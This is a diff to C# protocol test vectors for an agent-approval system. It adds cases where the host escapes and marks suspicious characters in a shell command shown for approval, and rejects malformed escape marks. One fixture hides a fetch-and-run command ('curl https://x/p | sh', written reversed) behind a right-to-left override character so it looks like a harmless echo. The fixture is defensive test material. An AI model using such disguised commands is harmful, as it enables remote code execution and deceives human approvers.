@@ -96,6 +96,12 @@ public static class ProtocolVectors
     // A Codex approval as a host lists it: its id is the hook marker's DecisionId and a digest
     // of what is shown (#958; the host's MappingTests pin this one). Opaque to a client.
     static readonly Question CodexApproval = Approval with { Id = "019a2f4e-7c1b-7d20-9e3a-5b6c7d8e9f01#e2c96713aea78522", Message = "Allow **Bash**?\n\n```\ngit push\n```" };
+    // An approval the host escaped anything in (#803): a right-to-left override, as the host shows it.
+    static readonly (string Shown, IReadOnlyList<(int Start, int Length)> Marks) EscapedCommand = ShownText.RevealMarked("Allow **shell**?\n\n```\necho done #\u202E ;hs | p/x//:sptth lruc\n```");
+    static readonly Question EscapedApprovalQuestion = Approval with
+    {
+        Id = "req-42#9b1c", Message = EscapedCommand.Shown, Escaped = EscapedApproval.For(EscapedCommand.Shown, EscapedCommand.Marks, EscapedApproval.Confirm),
+    };
     static readonly Question ManyTexts = new()
     {
         Id = "call_q3", Kind = QuestionKind.Form, Message = "Notes", AskedAt = T0,
@@ -213,11 +219,24 @@ public static class ProtocolVectors
             .Valid("a-codex-approval", CodexApproval)
             .Valid("truncated", Plain with { Truncated = true, Fields = [] })
             .Valid("a-delegates-question-answered-at-the-machine", Plain with { AnswerAtMachine = true, Agent = "agent-1" })
+            .Valid("an-escaped-approval", EscapedApprovalQuestion)
+            .Valid("an-escaped-approval-held-at-the-machine", EscapedApprovalQuestion with { Escaped = EscapedApprovalQuestion.Escaped! with { Approve = EscapedApproval.Machine } })
+            // More escapes than marks carry: whole, so Deny goes, and Approve is the machine's (#836 review).
+            .Valid("an-escaped-approval-with-too-many-escapes-to-mark", EscapedApprovalQuestion with { Escaped = EscapedApprovalQuestion.Escaped! with { Approve = EscapedApproval.TooMany } })
             .Reads("an-unknown-kind-reads-as-a-form", """{"id":"q","kind":"wizard","message":"m","fields":[],"askedAt":"2026-10-28T04:22:43.182Z"}""")
             // Never shown with a choice left out, or a choice without the words it was asked with.
             .Refused("a-choice-that-cannot-be-read", Broken(Approval, j => j["fields"]![0]!["options"]!.AsArray().Add(null)))
             .Refused("a-choice-label-that-is-not-text", Broken(Approval, j => j["fields"]![0]!["options"]![0]!["label"] = true))
-            .Refused("a-delegate-that-is-not-an-id", Broken(Plain with { Agent = "agent-1" }, j => j["agent"] = 1));
+            .Refused("a-delegate-that-is-not-an-id", Broken(Plain with { Agent = "agent-1" }, j => j["agent"] = 1))
+            // Read past, it would offer the one-tap Approve the confirmation replaced.
+            .Refused("escaped-text-that-cannot-be-read", Broken(EscapedApprovalQuestion, j => j["escaped"]!["marks"] = "all"));
+        f.Record<EscapedText>(Host)
+            .Valid("confirm", EscapedApprovalQuestion.Escaped!)
+            .Valid("at-the-machine", EscapedApprovalQuestion.Escaped! with { Approve = EscapedApproval.Machine })
+            // A mark is two whole numbers as sent: [s, null, l] read past as [s, l] would offer the
+            // confirmation for a mark the host never sent (#836 review).
+            .Refused("a-mark-holding-a-null", j => j["marks"]![0]!.AsArray().Insert(1, null))
+            .Refused("a-mark-holding-text", j => j["marks"]![0]![1] = "6");
         f.Record<Background>(Host)
             .Valid("agents-and-shells", new Background { Agents = 2, Shells = 1 })
             .Valid("shells-only", new Background { Agents = 0, Shells = 3 });
